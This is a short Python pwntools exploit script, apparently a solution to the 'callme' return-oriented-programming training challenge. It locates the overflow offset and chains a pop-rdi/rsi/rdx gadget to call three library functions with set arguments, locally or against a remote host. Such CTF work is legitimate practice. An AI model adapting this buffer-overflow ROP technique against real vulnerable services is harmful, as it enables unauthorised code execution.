#!/usr/bin/env python3

from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def find_offset(payload):
    proc = start()
    proc.sendlineafter(b'>', payload)
    proc.wait()
    ip_offset = cyclic_find(proc.corefile.read(proc.corefile.sp, 4))
    return ip_offset

exe = './callme'
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)
context.log_level = 'error'

# crafting the payload
offset = find_offset(cyclic(100))
info(f'Offfset: {offset:x}')
pop_args_gadget = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])[0]
info(f"Pop Args Gadget: {pop_args_gadget}")
payload = flat({
    offset: [
        pop_args_gadget,
        0xdeadbeefdeadbeef,
        0xcafebabecafebabe,
        0xd00df00dd00df00d,
        elf.symbols.callme_one,
        pop_args_gadget,
        0xdeadbeefdeadbeef,
        0xcafebabecafebabe,
        0xd00df00dd00df00d,
        elf.symbols.callme_two,
        pop_args_gadget,
        0xdeadbeefdeadbeef,
        0xcafebabecafebabe,
        0xd00df00dd00df00d,
        elf.symbols.callme_three
        ]
    })
write('payload', payload)
info(f"Payload: {payload}")

# executing exploit
io = start()
io.sendlineafter(b'>', payload)
io.interactive()
